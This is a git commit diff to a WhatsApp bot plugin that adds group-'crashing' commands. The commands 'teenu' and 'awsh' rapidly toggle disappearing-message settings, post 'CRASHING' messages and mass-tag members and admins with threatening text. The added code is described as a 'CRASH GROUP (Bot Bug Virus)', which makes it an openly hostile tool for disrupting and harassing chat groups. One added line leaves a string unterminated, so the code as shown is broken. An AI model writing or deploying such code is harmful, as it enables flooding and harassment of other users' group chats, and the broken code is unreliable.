56b97632501bab81adb56fa45e619004227168f8
Teenuh-X <88507137+jesonpro@users.noreply.github.com>
2021-10-17 13:53:54 +0530

    ©️TEENU-X

--- plugins/neotro.js
+++ plugins/neotro.js
@@ -5,32 +5,27 @@ NEOTROX - TEENUHX
 */
 
 const {MessageType, GroupSettingChange} = require('@adiwajshing/baileys');
-const Asena = require('../events');
+const Amazone = require('../events');
 const Config = require('../config');
 const UNQ = "wrong command dont type words after command"
-const DDO = `Bombing... `+Config.BOT_NAME+` `
-const ONO = ".tagall *☠HATZU HOLE We are Deamons Do not run away...*"
+const DDO = `👿CRASHING...BY `+Config.BOT_NAME+`👿`
+const UUU = "CRASH GROUP (Bot Bug Virus)
+const ONO = ".tagall *😈☠HATZU HOLE We are Deamons Do not run away...😈😈😈*"
 const Language = require('../language');
 const Lang = Language.getString('admin');
 const mut = Language.getString('mute');
 
-Asena.addCommand({pattern: 'teenu ?(.*)', fromMe: true, desc: DDO,deleteCommand: true}, (async (message, match) => {    
+Amazone.addCommand({pattern: 'teenu ?(.*)', fromMe: true, desc: UUU,deleteCommand: true}, (async (message, match) => {    
         if (match[1] == '') {
             await message.client.toggleDisappearingMessages(message.jid, 64000);
+            await message.client.sendMessage(message.jid,DDO,MessageType.text);
+            await message.client.sendMessage(message.jid,DDO,MessageType.text);
             await message.client.toggleDisappearingMessages(message.jid, 64000);
             await message.client.toggleDisappearingMessages(message.jid, 64000);
             await message.client.toggleDisappearingMessages(message.jid, 64000);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
             await message.client.toggleDisappearingMessages(message.jid, 64000);
+            await message.client.sendMessage(message.jid,ONO,MessageType.text);
+            await message.client.sendMessage(message.jid,".tagadmin",MessageType.text);
             await message.client.toggleDisappearingMessages(message.jid, 64000);
         }
         else {
@@ -40,26 +35,18 @@ Asena.addCommand({pattern: 'teenu ?(.*)', fromMe: true, desc: DDO,deleteCommand:
 }));
 
 
-Asena.addCommand({pattern: 'teenu ?(.*)', fromMe: true, desc: DDO, deleteCommand: true}, (async (message, match) => {    
+Amazone.addCommand({pattern: 'awsh ?(.*)', fromMe: true, desc: UUU, dontAddCommandList: true}, (async (message, match) => {    
         if (match[1] == '') {
-            await message.client.sendMessage(message.jid,".tg",MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 64000);
+            await message.client.sendMessage(message.jid,DDO,MessageType.text);
+            await message.client.sendMessage(message.jid,DDO,MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 64000);
+            await message.client.toggleDisappearingMessages(message.jid, 64000);
+            await message.client.toggleDisappearingMessages(message.jid, 64000);
+            await message.client.toggleDisappearingMessages(message.jid, 64000);
             await message.client.sendMessage(message.jid,ONO,MessageType.text);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
-            await message.client.toggleDisappearingMessages(message.jid, 0);
+            await message.client.sendMessage(message.jid,".tagadmin",MessageType.text);
+            await message.client.toggleDisappearingMessages(message.jid, 64000);
             
         }
         else {
